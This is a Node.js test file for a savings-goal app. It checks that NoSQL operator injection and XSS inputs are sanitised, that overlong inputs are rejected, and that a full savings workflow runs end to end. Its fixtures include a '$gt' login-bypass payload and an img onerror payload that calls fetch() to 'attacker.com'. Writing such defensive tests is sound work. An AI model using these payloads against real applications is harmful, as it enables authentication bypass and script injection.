const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const mongoose = require('mongoose');

const { sanitizeObject } = require('../src/middleware/sanitizeMiddleware');
const { sanitizeForPrompt } = require('../src/services/geminiService');
const { calculateFallbackPlan } = require('../src/services/geminiService');

describe('Module 8: Security Audits, Hardening & End-to-End Lifecycle Verification', () => {
  describe('Security Hardening & Injection Attacks (EC-8.1, EC-8.2, EC-8.3)', () => {
    it('sanitizes NoSQL operator injections from request payloads (EC-8.1)', () => {
      const maliciousPayload = {
        email: { $gt: '' },
        password: 'password123',
        nested: {
          $ne: null,
          validKey: 'safeValue',
          'dotted.key': 'shouldBeStripped',
        },
      };

      const sanitized = sanitizeObject(maliciousPayload);

      assert.strictEqual(sanitized.email.$gt, undefined, 'Operators starting with $ must be stripped');
      assert.strictEqual(sanitized.password, 'password123', 'Safe keys must be preserved');
      assert.strictEqual(sanitized.nested.$ne, undefined, 'Nested $ operators must be stripped');
      assert.strictEqual(sanitized.nested.validKey, 'safeValue');
      assert.strictEqual(sanitized.nested['dotted.key'], undefined, 'Dotted keys must be stripped');
    });

    it('neutralizes Cross-Site Scripting (XSS) vectors in prompt inputs (EC-8.2)', () => {
      const maliciousScript = '<img src=x onerror="fetch(\'https://attacker.com\')">';
      const sanitized = sanitizeForPrompt(maliciousScript);

      assert.doesNotMatch(sanitized, /[<>]/, 'Must not contain raw HTML opening or closing brackets');
      assert.match(sanitized, /&lt;img src=x onerror=&quot;fetch\(&#039;https:\/\/attacker\.com&#039;\)&quot;&gt;/);
    });

    it('defends against ReDoS through maximum input length bounds (EC-8.3)', () => {
      const longTitle = 'a'.repeat(101);
      const isTooLong = longTitle.trim().length > 100;
      assert.strictEqual(isTooLong, true, 'Titles exceeding 100 characters must be rejected before regex');

      const longNote = 'a'.repeat(201);
      const isNoteTooLong = longNote.trim().length > 200;
      assert.strictEqual(isNoteTooLong, true, 'Notes exceeding 200 characters must be rejected before regex');
    });

    it('verifies server-side UTC timestamps for clock synchronization (EC-8.7)', () => {
      const serverTimestamp = new Date().toISOString();
      assert.ok(serverTimestamp.endsWith('Z'), 'Server timestamp must be in ISO 8601 UTC format');
      assert.ok(!isNaN(new Date(serverTimestamp).getTime()), 'Server timestamp must be a valid date');
    });
  });

  describe('Full End-to-End System Workflow Integration (Modules 1–7)', () => {
    it('executes full savings goal lifecycle with contributions, AI pacing, group pooling, and dashboard metrics', () => {
      // 1. User & Goal Setup
      const mockUserId = new mongoose.Types.ObjectId().toString();
      const futureDate = new Date();
      futureDate.setDate(futureDate.getDate() + 60); // 60 days remaining

      const goal = {
        id: 'goal-e2e-1',
        ownerId: mockUserId,
        title: 'Emergency Fund 2027',
        category: 'emergency',
        targetAmount: 60000,
        currentAmount: 0,
        deadline: futureDate,
        status: 'active',
      };

      // 2. Contributions logging & atomic balance update
      const contributionAmount = 15000;
      goal.currentAmount += contributionAmount;
      const remainingAmount = goal.targetAmount - goal.currentAmount;
      const progressPercentage = Math.round((goal.currentAmount / goal.targetAmount) * 10000) / 100;

      assert.strictEqual(goal.currentAmount, 15000);
      assert.strictEqual(remainingAmount, 45000);
      assert.strictEqual(progressPercentage, 25);

      // 3. AI Savings Plan Pacing Generation (EC-5.1 - EC-5.8)
      const aiPlan = calculateFallbackPlan(goal);
      assert.ok(aiPlan.recommendedWeekly > 0);
      assert.ok(aiPlan.recommendedMonthly > 0);
      assert.strictEqual(aiPlan.achievabilityScore, 'Realistic');
      assert.ok(aiPlan.milestones.length >= 2);
      assert.match(aiPlan.disclaimer, /certified financial or investment advice/);

      // 4. Collaborative Group Pool Simulation (EC-6.1 - EC-6.7)
      const groupGoal = {
        id: 'group-e2e-1',
        title: 'Goa Trip 2027',
        targetAmount: 50000,
        currentAmount: 25000,
        members: [
          { userId: mockUserId, name: 'Alice (Owner)', role: 'owner' },
          { userId: 'user-2', name: 'Bob', role: 'member' },
        ],
      };

      // Group breakdown aggregation with non-contributing member handling
      const deposits = new Map([
        [mockUserId, { totalContributed: 20000, contributionCount: 2 }],
        ['user-2', { totalContributed: 5000, contributionCount: 1 }],
      ]);

      const breakdown = groupGoal.members.map((m) => {
        const stats = deposits.get(m.userId) || { totalContributed: 0, contributionCount: 0 };
        return {
          userId: m.userId,
          name: m.name,
          totalContributed: stats.totalContributed,
          percentageOfTarget: (stats.totalContributed / groupGoal.targetAmount) * 100,
        };
      });

      assert.strictEqual(breakdown[0].totalContributed, 20000);
      assert.strictEqual(breakdown[0].percentageOfTarget, 40);
      assert.strictEqual(breakdown[1].totalContributed, 5000);
      assert.strictEqual(breakdown[1].percentageOfTarget, 10);

      // 5. Dashboard Summary Aggregation (EC-7.1, EC-7.2)
      const allUserGoals = [goal, groupGoal];
      let totalSaved = 0;
      let totalTarget = 0;

      allUserGoals.forEach((g) => {
        totalSaved += g.currentAmount;
        totalTarget += g.targetAmount;
      });

      const overallProgress = Math.round((totalSaved / totalTarget) * 10000) / 100;
      assert.strictEqual(totalSaved, 40000); // 15k + 25k
      assert.strictEqual(totalTarget, 110000); // 60k + 50k
      assert.strictEqual(overallProgress, 36.36);

      // 6. Notification Dispatch on Goal Completion (EC-7.5)
      goal.currentAmount = goal.targetAmount; // reaches 100%
      const isCompleted = goal.currentAmount >= goal.targetAmount;
      assert.strictEqual(isCompleted, true);
    });
  });
});
